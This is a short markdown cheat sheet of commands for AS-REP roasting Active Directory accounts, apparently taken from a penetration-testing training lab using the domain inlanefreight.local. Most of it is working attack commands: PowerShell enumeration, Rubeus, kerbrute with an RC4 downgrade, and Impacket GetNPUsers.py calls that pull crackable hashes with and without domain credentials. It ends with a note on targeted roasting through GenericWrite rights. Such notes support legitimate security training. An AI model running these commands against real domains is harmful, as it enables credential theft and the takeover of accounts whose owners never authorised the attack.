## Commands
### windows
```powershell
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth
.\Rubeus.exe asreproast /user:jenna.smith /domain:inlanefreight.local /dc:dc01.inlanefreight.local /nowrap # Enumerate and get the hash.
```


---
### Linux

## Using kerbrute
```sh
kerbrute userenum --dc "$DC" -d "$DOMAIN" usernames.txt --downgrade # Force rc4 encryption
```

#### AS-REPRoastable Users Enumeration
```sh
GetNPUsers.py inlanefreight.local/pixis
```
Now that we have a list of vulnerable accounts, we can request their hashes in Hashcat's format by adding the `-request` parameter to our command.
```sh
GetNPUsers.py inlanefreight.local/pixis -request
```

#### Finding Vulnerable Accounts without Authentication
If we do not have credentials on the domain but have a username list, we can still find accounts that do not require pre-authentication. Using `GetNPUsers.py`, we can search for each account inside the file containing the user list to identify if there is a least one account vulnerable to this attack:
```
GetNPUsers.py INLANEFREIGHT/ -dc-ip 10.129.205.35 -usersfile /tmp/users.txt -format hashcat -outputfile /tmp/hashes.txt -no-pass
```

---
## Targeted AS-REPRoasting
We can perform AS-REP rosting even if it require pre-authentication, Suppose an attacker has `GenericWrite` or `GenericAll` permissions over an account. In that case, they can enable this attribute and obtain the `AS_REP` ticket for offline cracking to recover the account's password before disabling it again.